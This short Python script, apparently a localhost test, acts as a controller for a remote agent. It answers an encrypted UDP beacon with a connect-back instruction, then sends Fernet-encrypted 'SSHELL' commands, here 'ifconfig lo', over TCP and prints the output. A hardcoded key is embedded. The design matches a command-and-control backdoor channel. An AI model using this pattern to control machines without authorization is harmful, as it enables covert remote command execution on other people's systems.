from cryptography import fernet
from socket import socket
from json import dumps,loads

key =  "SFOxEwE1dzrTsXGjASTnOLSRG8zaV25_B1GeGuC2r-8="
aes = fernet.Fernet(key)

probe = socket(2,2)
client = socket()

probe.setsockopt(1,2,1)
client.setsockopt(1,2,1)
probe.bind(("127.0.0.1",8000))
client.bind(("127.0.0.1",9501))
client.listen(9)

data,addr = probe.recvfrom(1024)
recv_data = aes.decrypt(data)
print(recv_data)

req_comm = {'cmd':104,'addr':['127.0.0.1',9501],'id':90}
req_str = dumps(req_comm)
enc_data = aes.encrypt(req_str.encode())
probe.sendto(enc_data,addr)


cmd = ['SSHELL',{'cmd':'ifconfig lo'}]
enc_cmd = aes.encrypt(dumps(cmd).encode())

c,a = client.accept()

for i in "123":
	c.send(enc_cmd)
	data = c.recv(1024)
	cmdstr = aes.decrypt(data)
	cmdout = loads(cmdstr)
	print(cmdout[1])

c.close()
